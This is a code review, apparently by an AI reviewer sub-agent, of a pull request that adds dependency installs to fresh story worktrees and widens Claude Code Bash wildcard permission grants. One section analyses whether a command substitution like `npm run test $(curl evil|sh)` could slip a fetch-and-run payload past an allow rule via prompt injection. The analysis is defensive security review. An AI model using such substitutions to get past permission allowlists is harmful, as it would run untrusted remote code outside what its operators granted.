verdict: merge
reviewed-by: fresh reviewer sub-agent, claude-sonnet-5, dispatched by session tldr-experts-4a
against: 7a208cd

# fix/story-dod-deps — reviewed against 7a208cd (base a15fbc5), gh #209

## Wildcard allowlist security (the item asked to weigh most) — Minor, PLAUSIBLE, not blocking

Fetched code.claude.com/docs/en/permissions (2026-09-09) directly rather than trusting the
PR's own citation. Confirmed, quoted: "Claude Code is aware of shell operators, so a rule like
`Bash(safe-cmd *)` won't give it permission to run the command `safe-cmd && other-cmd`. The
recognized command separators are `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines. A rule must
match each subcommand independently." So `Bash(npm run test *)` does NOT let a `;`/`&&`/`|`
chain reach an ungranted program — CONFIRMS the PR's own claim and the comment in
`spawnAgent.ts:198`.

One nuance the PR's comment does not mention: the same doc section states subshells and
command substitutions are reached only by **deny/ask** rules ("Deny and ask rules apply when
any subcommand matches them, including a command nested inside a subshell, a command
substitution... even in auto mode") — it does not make the equivalent claim for allow rules.
Read plainly, that asymmetry suggests an allow-rule text match may not recurse into a `$(...)`
embedded in a granted command's trailing arguments, so `npm run test $(curl evil|sh)` could
textually satisfy `Bash(npm run test *)` without a deny rule to stop it. I have NOT run a live
Claude Code session to confirm this either way — this is inferred from doc wording, not
measured, and is exactly the kind of prompt-injection-into-Bash-args risk `--sandbox` (not
passed for the Claude path in `buildClaudeArgs`, only for Codex) is meant to backstop. It is
not a new class this PR introduces, though: the repo already ships `Bash(git add *)` /
`Bash(git commit *)` with the identical trailing-wildcard shape, so the same theoretical
surface already existed for the two verbs every developer turn ends on; this PR only extends
it to the repo's own declared build/test commands. Recommend filing a follow-up issue to
verify empirically (spawn a Claude Code session with only a wildcard grant and try a
substitution) rather than blocking this fix on it.

## Traced and CONFIRMED against the diff and worktree at 7a208cd

- `installCommandFor`/`runWorktreeInstall`/`absentBinaryOf`/`binaryAbsentReason` in the new
  `worktreeDeps.ts` are wired exactly as claimed: `installDeps()` (`executors/build.ts:1750`)
  called from `prepare()` (:632, in-session) and `buildHalf()` (:1121, headless), both gated on
  `story.freshWorktree` and both running AFTER any `this.writes.run(...)` block returns —
  outside the serial writer, as the code comment states.
- `install:` is read via `commandRoles`, never sniffed from command text (`installCommandFor`),
  and `hooks/lib/workspace.ts:239-241` already adds every role's value — install included —
  into the flat `commands` allowlist, so `runDodCommand` does not refuse it. This is pre-existing
  code this branch does not touch.
- Reviewer paths never call `installDeps` (grepped all `openStory`/`installDeps` call sites) —
  reviewer worktrees genuinely get no install, and `REVIEWER_TOOLS` (`Read,Grep,Glob,Bash(git
  diff *)`) is untouched, confirmed by both the diff and a passing test assertion.
- `freshWorktree` guards double-install: since it's only true the FIRST call that creates the
  worktree, a re-open (any of the four other `openStory` call sites, all post-build review
  paths where a merged commit already exists) sees `freshWorktree: false` and skips.
- 127 handling: `absentBinaryOf` only fires on exit 127, non-refused, non-timeout; `notFoundBinary`
  checks the zsh spelling first specifically to avoid capturing "zsh" itself as the binary name,
  correct on both fixture strings and exercised by a real test.
- Golden: exactly one added key, `tree: "worktree"`, on the five existing `check: "dod"`
  payloads across the four fixture files (headless #04, insession #03, refused #04, rounds #04
  and #11) — no other line changed. Named in CHANGELOG under `## 0.15.0 — unreleased` /
  `### Fixed`, satisfying §12's "say so" rule.
- Pre-flight parity: `baseResultOf`/`redBaseRefusal` (`dodRunner.ts`) write to
  `04-build/preflight.yml` only — they never emit a `check: "dod"` event at all, so there is no
  base-side event payload for `tree: "base"` to parity with. `preflight.yml` rows already carry
  `baseRef`/`baseSha`, which is how a reader tells them apart from the story's `events.jsonl`
  rows. Acceptable as-is; not a gap this diff created.
- docs/spec.md edits sit inside §2.1 (line 105, the `commands.install` row) and §2.9 (lines
  1339-1358, `tree`/`absent_binary`/`check:"install"`), matching the hunt list. EN/ES
  `unattended-operation.md` renumber the checklist in lockstep (1→6 both files) and both guides'
  new bullets read as real translations, not machine copies.
- `test/story-worktree-deps.test.ts`: exactly 8 new tests, hermetic (real `git worktree`, a
  committed `node install.js`/`install-fail.js`, `node_modules/.bin/dodbin` built by the fixture,
  own `PATH`/env cleanup in `afterEach`), calls `setDefaultTimeout(spawnTestTimeout())` so
  `test/machine-load.test.ts`'s dynamic `readdirSync`-based spawner check picks it up with no
  manual edit needed there.

## Commands run (targeted only, this worktree)

- `bun run typecheck` — exit 0.
- `bun test test/story-worktree-deps.test.ts test/build-golden.test.ts test/dod-allowlist.test.ts
  test/build-executor.test.ts test/stack-packs-prompt.test.ts test/facilitator.test.ts
  test/training.test.ts` — **352 pass, 0 fail, exit 0**.

No Critical or Important findings. The fix matches its own claims: `install:` now runs once
per fresh story worktree through the same allowlist-and-argv runner as any DoD command, a 127
is read as an environment absence rather than a red test, and the wider Bash grant is bounded
by Claude Code's own compound-command awareness for the chaining case that matters most. The
one open question (nested command substitution under a trailing-wildcard grant) is flagged
above as follow-up work, not a blocker, since it extends rather than introduces the risk shape
this repo already ships for `git add`/`git commit`.
